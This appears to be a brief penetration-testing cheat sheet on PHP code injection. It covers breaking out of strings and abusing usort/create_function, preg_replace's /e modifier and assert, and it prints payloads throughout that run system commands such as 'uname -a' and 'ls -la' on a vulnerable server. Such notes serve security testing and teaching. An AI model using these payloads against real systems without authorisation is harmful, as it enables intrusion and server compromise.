# Code injections

1. Injection examples

```
By using comments and injecting /* random value */
By injecting a simple concatenation "." (where " are used to break the syntax and reform it correctly).
By replacing the parameter you provided by a string concatenation, for example "."ha"."cker"." instead of hacker
```

2. Ways to break out code

```
By adding dummy code: ".system('uname -a'); $dummy="
By using comment: ".system('uname -a');# or ".system('uname -a');//
```

3. Unsort

The function usort is often used with the function create_function to dynamically generate the "sorting" function, based on user-controlled information. If the web application lacks potent filtering and validation, this can lead to code execution

To find out, we can inject single quote

```
id'
```

4. PCRE_REPLACE_EVAL (/e)

This modifier will cause the function preg_replace to evaluate the new value as PHP code, before performing the substitution.

```
phpinfo()
system("COMMAND")
```

5. Assert function may leeds to all sort of problems

This example is based on the function assert. When used incorrectly, this function will evaluate the value received. This behaviour can be used to gain code execution.

By injecting a single quote or double quote (depending on the way the string was declared), we can see an error message indicating that PHP tried to evaluate the code:

To use this vulnerabilitity
```
?name=value'.phpinfo().'
?name=value'.system("ls -la").'
```
